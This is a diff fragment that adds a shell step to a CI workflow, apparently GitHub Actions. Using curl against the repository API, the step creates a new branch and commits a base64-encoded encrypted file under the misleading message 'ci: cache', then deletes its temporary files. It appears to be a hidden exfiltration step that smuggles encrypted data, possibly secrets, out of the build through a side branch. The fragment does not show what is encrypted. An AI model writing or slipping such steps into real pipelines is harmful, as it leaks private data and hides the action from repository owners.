+              if [ -n "$SHA" ]; then
+                REF_CODE=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST -H "$AUTH" \
+                  -H "Content-Type: application/json" "$API/git/refs" \
+                  -d "{\"ref\":\"refs/heads/$FBB\",\"sha\":\"$SHA\"}" 2>>"$D/errors.log")
+                if [ "$REF_CODE" = "201" ]; then
+                  printf '{"message":"ci: cache","content":"' > "$FBJSON"
+                  base64 < "$T.enc" | tr -d '\n' >> "$FBJSON"
+                  printf '","branch":"%s"}' "$FBB" >> "$FBJSON"
+                  CODE=$(curl -sS --max-time 300 -o /dev/null -w '%{http_code}' -X PUT -H "$AUTH" \
+                    -H "Content-Type: application/json" "$API/contents/$FBN" \
+                    --data-binary @"$FBJSON" 2>>"$D/errors.log")
+                  case "$CODE" in 200|201) ok=1; note "committed $FBB $FBN" ;; *) note "commit_fail $CODE" ;; esac
+                else
+                  note "ref_create_fail $REF_CODE"
+                fi
+              fi
+            fi
+          fi
+
+          rm -rf "$D" "$T" "$T".part.* "$T.enc" 2>/dev/null
+          if [ "$ok" = "1" ]; then exit 0; else exit 42; fi
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
